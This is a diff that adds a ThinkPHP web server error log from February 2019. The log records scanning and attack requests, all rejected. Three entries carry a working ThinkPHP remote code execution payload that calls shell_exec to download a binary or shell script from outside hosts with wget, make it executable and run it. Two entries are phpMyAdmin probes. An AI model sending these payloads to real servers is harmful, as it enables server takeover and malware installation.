@@ -1,0 +1,15 @@
+[ 2019-02-02T03:14:22+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/Corona.x86_64;%20chmod%20777%20Corona.x86_64;./Corona.x86_64%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-02T03:33:18+08:00 ] 171.221.175.173 /phpmyadmin
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2019-02-02T07:16:25+08:00 ] 183.57.53.177 /phpmyadmin
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2019-02-02T12:40:31+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-02-02T15:53:45+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
